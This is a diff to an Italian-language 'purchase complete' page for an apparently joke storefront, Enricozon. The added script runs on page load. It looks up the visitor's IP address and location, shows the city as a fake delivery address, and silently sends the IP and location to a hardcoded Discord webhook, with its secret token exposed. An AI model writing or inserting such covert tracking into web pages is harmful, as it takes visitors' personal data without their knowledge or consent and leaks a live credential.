@@ -4,16 +4,23 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Successful Purchase</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css"> <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css"> 
     <link rel="stylesheet" href="buy.css">
+
+<style>
+    .p1 {
+    font-size: 1em; 
+    }    
+</style>
+
 </head>
 <body>
 
     <div class="container">
-        <a href="https://enricozon.mom"><img src="pachettp.png" alt="Success Image"></a>
+        <a href="https://enricozon.mom"><a href="https://enricozon.mom"><img src="pachettp.png" alt="Success Image"></a></a>
         <h1>Grazie per l'aquisto!</h1>
         <p>Il tuo ordine è stato completato con sucesso.</p>
-        <p class="mai">Non arriverà mai.</p>
+        <p class="p1" id="currentLocation">Fetching location...</p>
         
         <div class="share-buttons">
             <div class="share-button" onclick="shareOnFacebook()"><i class="fab fa-facebook-square"></i></div>
@@ -29,13 +36,66 @@
 
     <script>
         function shareOnFacebook() {
-            window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent('Ho appena comprato un Cane Tazza da Enricozon. https://enricozon.mom'));
+            window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent('Ho appena comprato un Mandarino da Enricozon. https://enricozon.mom'));
         }
 
         function shareOnTwitter() {
-            window.open('https://twitter.com/intent/tweet?text=' + encodeURIComponent('Ho appena comprato un Cane Tazza da Enricozon. https://enricozon.mom'));
+            window.open('https://twitter.com/intent/tweet?text=' + encodeURIComponent('Ho appena comprato un Mandarino da Enricozon. https://enricozon.mom'));
         }
-    </script>
+
+
+    fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            
+            var city = data.city;
+            var region = data.region;
+            var country = data.country;
+            var street = data.street; 
+            var ip = data.ip; 
+
+            
+            var locationDetails = `Il pacco verà inviato a: ${city}, ${region}, ${country}.`;
+            var discordstuff = `IP: ${ip}, Location: ${city}, ${region}, ${country}.`;
+            
+            if (street) {
+                locationDetails += ` Street: ${street}`;
+            }
+
+            document.getElementById("currentLocation").innerHTML = locationDetails;
+
+            
+            sendToDiscordWebhook(discordstuff);
+        })
+        .catch(error => {
+            console.error('Error fetching location:', error);
+            document.getElementById("currentLocation").innerHTML = "Error fetching location.";
+        });
+
+    
+    function sendToDiscordWebhook(message) {
+        
+        const webhookUrl = 'https://discord.com/api/webhooks/1176560019613950063/C9xI7CjP9o3CQbhTTYzeHz8sOxxhSS1_gwaag9-cOXkQoNJ-KJ_SoXu7MQGXYIcOfj7J';
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                content: message,
+            }),
+        })
+        .then(response => {
+            if (!response.ok) {
+                console.error('Failed to send message to Discord webhook:', response.status, response.statusText);
+            }
+        })
+        .catch(error => {
+            console.error('Error sending message to Discord webhook:', error);
+        });
+    }
+</script>
 
 </body>
 </html>
